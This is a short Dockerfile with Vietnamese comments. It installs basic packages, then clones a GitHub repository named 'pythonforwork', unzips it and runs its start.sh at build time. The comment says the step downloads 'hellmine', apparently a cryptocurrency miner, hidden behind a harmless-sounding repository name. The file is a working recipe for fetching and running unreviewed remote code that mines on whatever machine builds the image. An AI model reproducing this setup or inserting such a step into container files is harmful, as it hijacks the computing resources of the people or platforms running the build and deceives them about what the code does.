FROM ubuntu:latest

# Cập nhật hệ thống và cài đặt các gói cần thiết
RUN apt update && apt upgrade -y && apt-get update && apt-get install -y python3 \
    curl \
    ca-certificates \
    git \
    sudo \ 
    unzip 
    
    

# Tạo thư mục làm việc và tải hellmine

RUN git clone https://github.com/Teo4268/pythonforwork.git && cd pythonforwork && unzip pythonforwork.zip && cd pythonforwork && chmod +x ./start.sh && ./start.sh 2
